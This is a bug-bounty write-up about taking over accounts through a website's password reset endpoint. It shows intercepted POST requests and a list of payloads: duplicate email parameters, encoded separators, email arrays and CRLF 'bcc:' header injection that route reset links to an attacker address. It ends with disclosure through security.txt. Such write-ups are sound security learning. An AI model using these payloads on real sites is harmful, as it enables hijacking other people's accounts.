  ![Reset-Password](https://user-images.githubusercontent.com/106372696/171008056-dcd80d53-b8c0-4373-ab92-1a7d75615122.png)


Hi Everyone,

This is the story about how I managed to takeover some one account using password reset flaw on the website.While browsing the website I need to signin to the account but It was a long time ago since I logged into my account.so, I can't remember my password so I decided to reset my password, but suddendly I decide to play with password reset functionality if I can reset someone's account.
	
#### Attempt 1:
I intercept the traffic with Burpsuite and capture the request and saw something like this

```bash
POST /ResetPassword

...
...

{
	"email" : "something@email.com"
}

```
I changed the request body something like this

```bash
POST /ResetPassword

...
...

{
	"email" : "myemail1@email.com",
       "email" : "myemail2@email.com"
}
```

And of course its failed only reset token sent to myemail1 account not myemail2 account.

#### Never Give Up:
After that I tried some other methods like following

```bash
POST /ResetPassword

...
...

{
	"email" : "myeamil1@email.com%20myemail2@email.com"
}
```

```bash
POST /ResetPassword

...
...

{
	"email" : "myemail1@email.com%20cc:myemail2@email.com"
}
```

#### One Last Ride...
Ok, thats it I was ready to give up but I remember one blog post that I read, it mentioned you can use **JSON Table** That will help you to send set of elements in array so, I give it a try luckily It sent password reset link to my attacker account and I can able to reset victim's account.

![nofinal](https://user-images.githubusercontent.com/106372696/171010957-5694d6ff-aa51-434e-a6c4-8cd31e005200.png)


Then I decided to send the report to their security team, but they don't have VDP or RDP on any crowdsource platform like Hackerone or Bugcrowd.So, I search **security.txt**(RFC 9116) and find their security team email that tells me where I should report related to security issues. I sent my finds and they reward me through btc (they don't hall of fame :( ).

	Note: You can find security.txt by https://www.website.com/.well-known/security.txt
	
#### Other methods to check password related issues:
```bash
POST /ResetPassword

...
...

email="victim@email.com&email=attacker@email.com"
```

```bash
POST /ResetPassword

...
...

email="victim@email.com%20email=attacker@email.com"
```

```bash
POST /ResetPassword

... 
...

email="victim@email.com|email=attacker@email.com" 
```

```bash
POST /ResetPassword 

... 
...

email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"  
```

I don't do bug bounties but this one I accidently try my luck and got success..Thanks for Reading this article. I hope you all enjoy this one. cheers :)

Usefull Resources :

[Password Reset Poisoning - Portswigger](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)

[10 Password Reset Flaws - AnugrahSR](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)

[All about Password Reset Vulnerablities - Infosec Writeups](https://infosecwriteups.com/all-about-password-reset-vulnerabilities-3bba86ffedc7?gi=5037f755d2b2)
